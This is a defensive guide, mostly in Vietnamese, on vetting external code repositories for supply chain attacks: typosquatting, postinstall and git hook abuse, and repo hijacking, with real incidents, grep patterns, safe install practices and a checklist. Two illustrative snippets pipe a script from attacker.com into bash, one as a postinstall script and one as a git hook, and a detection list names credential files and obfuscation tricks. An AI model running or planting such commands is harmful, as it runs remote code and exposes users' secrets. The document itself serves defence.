# Repo Vetting Knowledge: Supply Chain Security
**Purpose:** Kiến thức để kiểm tra và lọc repos bên ngoài trước khi nạp vào AI OS.  
**Applies to:** Tất cả repos trong `references.md` và bất kỳ repo nào trong tương lai.

---

## 1. Supply Chain Attacks — Các Loại Tấn Công Phổ Biến

### 1.1 Typosquatting (Giả mạo tên)
Repo/package có tên **gần giống** với package nổi tiếng, chỉ khác 1-2 ký tự.
```
Thật:  lodash    → Giả: 1odash, Iodash, lodahs
Thật:  react     → Giả: r3act, reakt
Thật:  claude-mem → Giả: claude-mem0, cIaude-mem
```
**Check:** So sánh URL chính xác với repo đã verify trong references.md.

### 1.2 Dependency Confusion
Attacker upload package lên npm/pypi với tên giống internal package của công ty lớn.  
**Check:** Verify chính xác `package.json` dependencies với npm registry trực tiếp.

### 1.3 Postinstall Script Attack (Rủi ro CAO NHẤT)
Malicious code ẩn trong `postinstall` script của `package.json`:
```json
{
  "scripts": {
    "postinstall": "curl https://attacker.com/steal.sh | bash"
  }
}
```
**Check:** Luôn đọc TẤT CẢ scripts trong `package.json` trước khi `npm install`.

### 1.4 Git Hook Injection
File trong `.git/hooks/pre-commit`, `post-checkout`, v.v. có thể tự chạy khi bạn thao tác git:
```bash
# .git/hooks/post-checkout
#!/bin/bash
curl https://attacker.com/exfil.sh | bash
```
**Check:** Kiểm tra `.git/hooks/` ngay sau clone. Xóa nếu có file lạ.

### 1.5 Repo Hijacking (Chiếm quyền repo)
Tác giả gốc abandon repo → Attacker mua domain cũ hoặc chiếm account → Push malicious commit.
Ví dụ thực tế: **event-stream** (npm, 2018) — package bị hijack, thêm code đánh cắp Bitcoin wallet.
**Check:** Xem lỗi spike bất thường trong commit history.

### 1.6 Stars Inflation / Astroturfing
Repo mới có 5000 stars sau 1 tuần = mua bot stars để tạo tín nhiệm giả.  
**Check:** Xem ngày tạo repo vs số stars. Check Stargazers List — nhiều accounts mới không có activity.

---

## 2. Real-World Attack Examples (học để nhận diện)

| Incident | Year | Method | Damage |
|----------|------|--------|--------|
| **event-stream** (npm) | 2018 | Dependency hijack + postinstall | Đánh cắp Bitcoin wallets |
| **SolarWinds** | 2020 | Build pipeline compromise | ~18,000 organizations compromised |
| **XZ Utils** | 2024 | Long-term social engineering → backdoor | SSH server backdoor trên Linux |
| **ua-parser-js** | 2021 | npm account takeover | Crypto miner + info stealer |
| **node-ipc** | 2022 | Intentional sabotage by author | Wiped files on Russia/Belarus IPs |
| **faker.js** | 2022 | Intentional sabotage by author | Infinite loop, broke builds |

**Lesson:** Ngay cả các repos uy tín cũng có thể bị tấn công. Trust nhưng must verify.

---

## 3. Data Exfiltration (Leak Data) — Cách Nhận Biết

### Code patterns đáng ngờ cần grep:
```
# Network calls (data gửi đi ngoài)
curl, wget, Invoke-WebRequest, fetch(, XMLHttpRequest
requests.post, requests.get, urllib, httpx

# System info collection
os.getenv, process.env, $env:, environ[
os.popen, subprocess.run, exec(, eval(
socket.gethostname, platform.node()

# File access (đọc files nhạy cảm)
~/.ssh, ~/.aws, .env, APPDATA, %USERPROFILE%
glob("**/.env"), os.walk, Path.home()

# Encoding/obfuscation (ẩn code độc)
base64.decode, atob(, Buffer.from(..., 'base64')
String.fromCharCode, \x41\x42 (hex encoding)
```

### Legitimate repos sẽ KHÔNG:
- Gửi network request trong `postinstall` script
- Đọc SSH keys hoặc `.env` files
- Sử dụng base64 decode để chạy code
- Có hexadecimal/obfuscated strings trong source

---

## 4. Safe Practices cho npm/pip/git

### npm (Node.js)
```powershell
# Xem scripts trước install
cat package.json | Select-String -Pattern "scripts" -Context 0,10

# Install không chạy scripts
npm install --ignore-scripts

# Kiểm tra dependencies có vấn đề
npm audit

# Xem actual package trước install (dry run)
npm pack --dry-run <package-name>
```

### pip (Python)  
```powershell
# Xem source trước install
pip download <package> --no-deps -d ./tmp-inspect
# Unzip và đọc setup.py

# Install trong virtual environment (isolated)
python -m venv venv-test
.\venv-test\Scripts\activate
pip install <package>
```

### git
```powershell
# Shallow clone (less attack surface)
git clone --depth=1 <url>

# Check hooks ngay sau clone
Get-ChildItem ".git\hooks" | Where-Object { -not $_.Name.EndsWith(".sample") }

# Xóa tất cả hooks
Remove-Item ".git\hooks\*" -Exclude "*.sample"
```

---

## 5. Đánh Giá Nhanh Các Repos Trong references.md

| Repo | Trust Level | Lý do | Pre-caution |
|------|------------|-------|-------------|
| `anthropics/claude-code` | ✅ HIGH | Official Anthropic org | Skip clone (read docs only) |
| `HKUDS/LightRAG` | ✅ HIGH | University research, 10k+ stars | Shallow clone OK |
| `bmad-code-org/BMAD-METHOD` | ✅ HIGH | Verified org, active community | Shallow clone OK |
| `affaan-m/everything-claude-code` | 🟡 MEDIUM | Personal repo, Anthropic hackathon winner | Read all scripts first |
| `thedotmack/claude-mem` | 🟡 MEDIUM | Personal repo, requires PostgreSQL | Check postinstall scripts |
| `FareedKhan-dev/all-agentic-architectures` | ✅ HIGH | Educational, no npm needed | LEARN-ONLY, no install |
| `qwibitai/nanoclaw` | 🟡 MEDIUM | Node.js + Docker required | Không chạy npm install |
| `HKUDS/nanobot` | 🟡 MEDIUM | Python-based | Check requirements.txt |
| `nextlevelbuilder/ui-ux-pro-max-skill` | 🔴 UNKNOWN | Ít thông tin | Manual review trước |
| `openclaw/openclaw` | ❌ SKIP | Large codebase, security concerns noted | Đã quyết định SKIP |

---

## 6. Checklist Nhanh (In ra để dùng)

```
PRE-CLONE CHECKLIST
═══════════════════
[ ] Verify URL chính xác khớp với references.md
[ ] Kiểm tra GitHub: stars, last commit, contributors, license
[ ] Không có spike bất thường trong star history
[ ] Clone vào D:\APP\QUARANTINE\ với --depth=1
[ ] Xóa .git\hooks\ (tất cả non-.sample files)
[ ] Đọc package.json/requirements.txt nếu có
[ ] Chạy vet_repo.ps1 — chờ PASS
[ ] Chỉ copy FILES CỤ THỂ cần dùng vào AI OS
[ ] Xóa QUARANTINE folder sau khi xong
[ ] Chạy security_shield scan /scan trên files mới
```
